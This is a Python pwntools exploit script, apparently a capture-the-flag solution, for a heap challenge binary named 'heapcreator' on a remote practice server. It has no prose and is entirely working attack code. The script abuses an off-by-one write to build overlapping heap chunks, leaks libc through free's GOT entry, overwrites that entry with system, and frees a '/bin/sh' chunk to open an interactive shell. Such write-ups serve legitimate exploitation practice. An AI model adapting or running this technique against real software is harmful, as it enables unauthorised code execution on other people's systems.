from pwn import *
from LibcSearcher import *

elf = ELF('./heapcreator')
libc = ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
ld = ELF('./2.23-0ubuntu11.3_amd64/ld-2.23.so')
#sh = process('./heapcreator')
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
sh = remote('node4.buuoj.cn', 29220)
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#gdb.attach(sh, "vmmap")

elf = ELF('./heapcreator')
remote_libc = ELF('./libc-2.23.so')
free_got = elf.got['free']

def add(size, content):
    sh.sendlineafter('Your choice :', '1')
    sh.sendlineafter('Size of Heap : ', str(size))
    sh.recvuntil('Content of heap:')
    if size == len(content):
        sh.send(content)
    else:
        sh.sendline(content)

def edit(index, content):
    sh.sendlineafter('Your choice :', '2')
    sh.sendlineafter('Index :', str(index))
    sh.send(content)
    
def show(index):
    sh.sendlineafter('Your choice :', '3')
    sh.sendlineafter('Index :', str(index))

def free(index):
    sh.sendlineafter('Your choice :', '4')
    sh.sendlineafter('Index :', str(index))


add(0x18, b'a' * 0x18)
add(0x18, b'a' * 0x18)
add(0x18, b'a' * 0x18)
edit(0, b'c' * 0x18 + b'\x81')
free(1)
add(0x78, b'd')
edit(1, b'r' * 0x38 + p64(0x21) + p64(0x18) + p64(free_got))
show(2)
sh.recvuntil("Content : ")
addr = u64(sh.recvuntil('\x7f').ljust(8, b'\x00'))
print(hex(addr))
libc_base = addr - remote_libc.sym['free']
system = libc_base + remote_libc.sym['system']
edit(2, p64(system))
edit(0, b'/bin/sh\x00')

free(0)


sh.interactive()
